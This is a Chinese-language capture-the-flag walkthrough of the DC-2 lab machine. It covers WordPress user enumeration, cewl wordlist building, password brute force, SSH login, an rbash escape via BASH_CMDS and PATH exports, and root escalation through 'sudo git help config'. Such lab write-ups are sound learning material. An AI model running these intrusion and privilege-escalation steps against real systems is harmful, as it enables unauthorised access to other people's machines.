---
title: DC2
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-11T22:10:39+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
获取目标IP ==> 192.168.121.145
```

发现无法访问目标，输入目标IP后变成了dc-2的域名，网上搜发发现是不解析的问题，可通过修改hosts文件解决

```
vim /etc/host 
添加 192.168.121.145 dc-2 即可正常访问
在网页中发现flag1
```

![flag1](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\flag1.png)

提示我们需要登录看到下一个flag，先进行信息收集吧，很显然这是一个wordpress站点，找到登录框之后我们可以进行密码爆破

gobuster进行目录扫描

```
gobuster dir -u http://dc-2 -w /usr/share/wordlists/dirb/big.txt
```

得到以下目录

```
/wp-admin             (Status: 301) [Size: 299] [--> http://dc-2/wp-admin/]
/wp-content           (Status: 301) [Size: 301] [--> http://dc-2/wp-content/]
/wp-includes          (Status: 301) [Size: 302] [--> http://dc-2/wp-includes/]
```

/wp-admin是登录位置，/wp-includes可以看到很多泄露的文件，稍微浏览一下，基本都是php文件，无法得到文件内容

抓个包进行账户密码的爆破，bp上爆破速度太慢

namp扫描目标端口信息

```
nmap -A 192.168.121.145 -p-
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-generator: WordPress 4.7.10
|_http-title: DC-2 &#8211; Just another WordPress site
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
MAC Address: 00:0C:29:E0:14:4D (VMware)
能够看到7744端口开放了ssh连接
```

使用wpscan查看目标wordpress信息

```
wpscan --url http://dc-2
```

由于我们没有用户名，通过wpscan枚举当前网站注册过的用户

可以得到用户名字典

![users](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\users.png)

有了用户名字典，爆破就会快很多，然而当我使用wpscan通过默认的rockyou字典进行爆破时，我发现基数仍然具有四千多万，只好另辟蹊径

cewl时kali中一个自定义的字典生成器，可通过爬取网站来达到生成字典的目的

```
cewl http://dc-2 -w dc-2.txt
```

这样爆破目标就更小了，成功得到两个用户名和密码

![u-p](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\u-p.png)

尝试进行登录，成功进入后台，但并不是admin，该站点时wordpress 4.7.10的版本，在用户位置能够看到更改密码处为一串hash值对应我们的密码

```
hM7iWeEl$Thz8YQozq#aGAnc ==> parturient
```

在jerry的账户下找到了flag2

![flag2](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\flag2.png)

既然得到了版本信息，我尝试去msf寻找一些历史的rce漏洞进行反向shell，但是都没有成功，只好去看wp，发现是要连接ssh

ssh连接jerry的账号失败了，但是能够成功连接tom的账户

```
shh tom@192.168.121.145 -p 7744
```

![ls](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\ls.png)

能够看到目录下有flag3.txt但是我们没有cat命令,发现这里的shell是-rbash，我想直接切换/bin/bash但是失败了，但是vi可以成功查看到flag3



![flag3](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\flag3.png)

tom一直追逐着jerrry,看来是要获取jerry的账号,但是我们现在是rbash限制，没有su命令，但是可以中export

```
BASH_CMDS[a]=/bin/sh;a       #注：把 /bin/sh 给a变量并调用
export PATH=$PATH:/bin/      #注：将 /bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   #注：将 /usr/bin 作为PATH环境变量导出
```

如此我们就能su到jerry用户下，并且在home中找到flag4.txt

![flag4.txt](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\flag4.txt.png)

flag4中提示我们git go on,很显然通过jerry，我们无法直接进入root目录，

```
sudo -l 
```

寻找能以root用户执行的命令，发现git命令存在，估计是要使用git命令进行提权，上在线工具找下get提权

```
sudo git help config 
!/bin/bash
即可成功提权root
```

![root](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\root.png)

最后进root目录找flag!

![users](E:\笔记软件\笔记\渗透测试\靶机练习\DC2图库\users.png)

成功拿下最后一个flag

### 总结：

和DC1完全是两个感觉，前者可以直接上msf进行漏洞利用，DC2不能，反而是利用一些针对wordpress的工具进行扫描，这一次没有用nmap扫描端口，是后面补上的，没有想到后面居然要用ssh进行连接，怪就怪在自己的信息收集不完善；同时学会了cewl爬取网站信息做字典的快捷操作，毕竟用常规的rockyou放到靶机上来说不太合适，速度过于缓慢，而且不一定能出；也继续积累了提权操作，后面打算专门做提权相关的研究
